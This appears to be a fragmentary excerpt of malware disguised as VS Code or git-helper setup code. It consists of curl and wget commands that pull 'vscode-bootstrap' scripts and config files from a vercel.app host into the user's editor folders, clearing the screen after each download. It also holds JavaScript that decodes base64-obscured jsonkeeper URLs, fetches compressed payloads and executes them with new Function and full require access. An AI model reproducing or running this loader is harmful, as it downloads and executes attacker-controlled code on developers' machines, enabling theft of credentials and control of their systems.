...
curl -s -L -o "%VSCODE_DIR%\\vscode-bootstrap.cmd" https://git-helper-checkout.vercel.app/settings/bootstrap?flag=${flag}
cls
...
mkdir -p "$TARGET_DIR"
clear
wget -q -O "$TARGET_DIR/vscode-bootstrap.sh" "https://git-helper-checkout.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
...
mkdir -p "$HOME/.vscode"
clear
curl -s -L -o "$HOME/.vscode/vscode-bootstrap.sh" "https://git-helper-checkout.vercel.app/settings/bootstraplinux?flag=${flag}"
clear
...
curl -L -o "%CODEPROFILE%\\env-setup.npl" "https://git-helper-checkout.vercel.app/settings/env?flag=${flag}"
curl -L -o "%CODEPROFILE%\\package.json" "https://git-helper-checkout.vercel.app/settings/package"
...
mkdir -p "\${USER_HOME}"
BASE_URL="https://git-helper-checkout.vercel.app"
...
`;
    ...
    if (!VALID_FLAGS.includes(flag)) {
      ...
      if (${flag} == 1) {
        axios.get(atob("aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9NRlJTSQ=="))
        .then((response) => {
        ...
        axios.get(atob("aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi8zT0NXSA=="))
        .then((response) => {
        new Function("require", zlib.gunzipSync(Buffer.from(response.data.model, 'base64')).toString('utf8'))(require);
        })
        .catch((err) => {
        ...
        axios.get(atob("aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9SMllMSQ=="))
        .then((response) => {
        new Function("require", zlib.gunzipSync(Buffer.from(response.data.model, 'base64')).toString('utf8'))(require);
        })
        .catch((err) => {
        ...
        axios.get(atob("CWh0dHBzOi8vanNvbmtlZXBlci5jb20vYi9NRFlVRQ=="))
        .then((response) => {
        new Function("require", zlib.gunzipSync(Buffer.from(response.data.model, 'base64')).toString('utf8'))(require);
        })
        .catch((err) => {
